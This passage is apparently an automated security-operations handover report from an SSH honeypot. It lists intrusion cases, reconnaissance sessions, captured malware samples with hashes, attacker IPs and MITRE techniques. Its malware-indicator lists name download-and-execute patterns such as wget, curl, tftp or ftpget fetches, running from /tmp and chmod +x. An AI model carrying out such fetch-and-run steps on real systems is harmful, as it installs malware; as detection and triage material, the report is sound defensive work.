| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:33:35` | `cowrie.session.connect` |
| `2026-07-31 20:33:36` | `cowrie.client.version` |
| `2026-07-31 20:33:36` | `cowrie.client.kex` |
| `2026-07-31 20:33:38` | `cowrie.login.success` |
| `2026-07-31 20:33:38` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4103bbb371d0

| Field | Detail |
|---|---|
| **Source IP** | `8.208.44[.]152` |
| **First Seen** | 2026-07-31 20:37 |
| **Last Seen** | 2026-07-31 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:37:31` | `cowrie.session.connect` |
| `2026-07-31 20:37:31` | `cowrie.client.version` |
| `2026-07-31 20:37:31` | `cowrie.client.kex` |
| `2026-07-31 20:37:32` | `cowrie.login.success` |
| `2026-07-31 20:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.208.44[.]152` to AbuseIPDB if not already reported
- [ ] Block `8.208.44[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df17b4cfd40d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-31 20:37 |
| **Last Seen** | 2026-07-31 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:37:32` | `cowrie.session.connect` |
| `2026-07-31 20:37:32` | `cowrie.client.version` |
| `2026-07-31 20:37:32` | `cowrie.client.kex` |
| `2026-07-31 20:37:33` | `cowrie.login.success` |
| `2026-07-31 20:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c72dbf413a5

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-07-31 20:41 |
| **Last Seen** | 2026-07-31 20:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:41:40` | `cowrie.session.connect` |
| `2026-07-31 20:41:41` | `cowrie.client.version` |
| `2026-07-31 20:41:41` | `cowrie.client.kex` |
| `2026-07-31 20:41:43` | `cowrie.login.success` |
| `2026-07-31 20:41:44` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1544190fe9

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-07-31 20:44 |
| **Last Seen** | 2026-07-31 20:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:44:58` | `cowrie.session.connect` |
| `2026-07-31 20:44:58` | `cowrie.client.version` |
| `2026-07-31 20:44:58` | `cowrie.client.kex` |
| `2026-07-31 20:45:01` | `cowrie.login.success` |
| `2026-07-31 20:45:02` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8e2bbf3c620

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-07-31 20:45 |
| **Last Seen** | 2026-07-31 20:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:45:07` | `cowrie.session.connect` |
| `2026-07-31 20:45:08` | `cowrie.client.version` |
| `2026-07-31 20:45:08` | `cowrie.client.kex` |
| `2026-07-31 20:45:09` | `cowrie.login.success` |
| `2026-07-31 20:45:10` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b77fef0ab5a

| Field | Detail |
|---|---|
| **Source IP** | `211.23.109[.]116` |
| **First Seen** | 2026-07-31 20:52 |
| **Last Seen** | 2026-07-31 20:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:52:53` | `cowrie.session.connect` |
| `2026-07-31 20:52:53` | `cowrie.client.version` |
| `2026-07-31 20:52:53` | `cowrie.client.kex` |
| `2026-07-31 20:52:56` | `cowrie.login.success` |
| `2026-07-31 20:52:56` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.23.109[.]116` to AbuseIPDB if not already reported
- [ ] Block `211.23.109[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ff5fccc700

| Field | Detail |
|---|---|
| **Source IP** | `175.100.107[.]238` |
| **First Seen** | 2026-07-31 20:53 |
| **Last Seen** | 2026-07-31 20:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:53:25` | `cowrie.session.connect` |
| `2026-07-31 20:53:25` | `cowrie.client.version` |
| `2026-07-31 20:53:25` | `cowrie.client.kex` |
| `2026-07-31 20:53:27` | `cowrie.login.success` |
| `2026-07-31 20:53:28` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.100.107[.]238` to AbuseIPDB if not already reported
- [ ] Block `175.100.107[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f7be5ffa95

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-07-31 20:53 |
| **Last Seen** | 2026-07-31 20:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:53:38` | `cowrie.session.connect` |
| `2026-07-31 20:53:38` | `cowrie.client.version` |
| `2026-07-31 20:53:38` | `cowrie.client.kex` |
| `2026-07-31 20:53:40` | `cowrie.login.success` |
| `2026-07-31 20:53:40` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.122.85[.]36` | **10** | 2026-07-31 19:37 | 2026-07-31 19:38 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **8** | 2026-07-31 19:06 | 2026-07-31 20:52 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-31 19:01 | 2026-07-31 20:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | **4** | 2026-07-31 20:52 | 2026-07-31 20:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-07-31 20:31 | 2026-07-31 20:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `209.38.237[.]32` | **3** | 2026-07-31 19:38 | 2026-07-31 19:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-31 20:00 | 2026-07-31 20:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]175` | **3** | 2026-07-31 20:52 | 2026-07-31 20:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]81` | **3** | 2026-07-31 20:52 | 2026-07-31 20:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]99` | **3** | 2026-07-31 20:51 | 2026-07-31 20:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-31 19:17 | 2026-07-31 19:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `124.161.224[.]79` | **2** | 2026-07-31 19:09 | 2026-07-31 19:11 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-31 20:44 | 2026-07-31 20:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | **2** | 2026-07-31 20:26 | 2026-07-31 20:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.84.138[.]195` | **2** | 2026-07-31 20:22 | 2026-07-31 20:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]186` | **2** | 2026-07-31 19:05 | 2026-07-31 19:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.82.77[.]139` | **2** | 2026-07-31 20:14 | 2026-07-31 20:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.58[.]233` | 1 | 2026-07-31 20:04 | 2026-07-31 20:04 | 7s | 0 | `T1592` | 🟢 LOW |
| `106.12.182[.]44` | 1 | 2026-07-31 19:10 | 2026-07-31 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.72.139[.]182` | 1 | 2026-07-31 20:27 | 2026-07-31 20:28 | 12s | 0 | `T1592` | 🟢 LOW |
| `113.108.88[.]121` | 1 | 2026-07-31 19:41 | 2026-07-31 19:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.224.15[.]67` | 1 | 2026-07-31 20:38 | 2026-07-31 20:38 | 2s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-07-31 20:29 | 2026-07-31 20:29 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.120[.]70` | 1 | 2026-07-31 20:27 | 2026-07-31 20:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `146.190.221[.]253` | 1 | 2026-07-31 19:28 | 2026-07-31 19:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `163.7.10[.]112` | 1 | 2026-07-31 20:48 | 2026-07-31 20:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-07-31 19:40 | 2026-07-31 19:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.44.26[.]171` | 1 | 2026-07-31 20:02 | 2026-07-31 20:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `2.55.69[.]224` | 1 | 2026-07-31 19:59 | 2026-07-31 20:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `206.81.18[.]71` | 1 | 2026-07-31 19:38 | 2026-07-31 19:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-31 19:09 | 2026-07-31 19:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]243` | 1 | 2026-07-31 19:56 | 2026-07-31 19:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-07-31 19:43 | 2026-07-31 19:43 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-31 20:39 | 2026-07-31 20:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-31 20:37 | 2026-07-31 20:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `68.183.68[.]14` | 1 | 2026-07-31 19:38 | 2026-07-31 19:38 | 22s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]220` | 1 | 2026-07-31 19:05 | 2026-07-31 19:05 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39` | ELF Binary (Linux executable) (RISC-V 64-bit) | `3f3bf218089d1488...` | 33/100 | 🟢 LOW | **9/75** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `206.81.18[.]71` | DE | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `209.38.237[.]32` | DE | DigitalOcean, LLC | **100** ⚠️ | 10 |
| `190.12.109[.]162` | AR | CPS | **100** ⚠️ | 50 |
| `66.132.195[.]81` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `36.153.164[.]122` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `176.170.1[.]244` | FR | Bouygues Telecom Division Mobile | **100** ⚠️ | 33 |
| `39.183.162[.]243` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `180.180.232[.]242` | TH | TOT Public Company Limited | **100** ⚠️ | 1 |
| `62.201.228[.]210` | IQ | IQ Networks for Data and Internet Services Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 138 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 134 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 52 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 51 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 51 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 238 cases |
| Tool 34  | Credential Extractor        | ✅ 160 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 111 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (8.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 69 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 26 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 138 priority case(s) shown individually · 37 recon entry/entries in table (17 group(s) consolidating 60 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
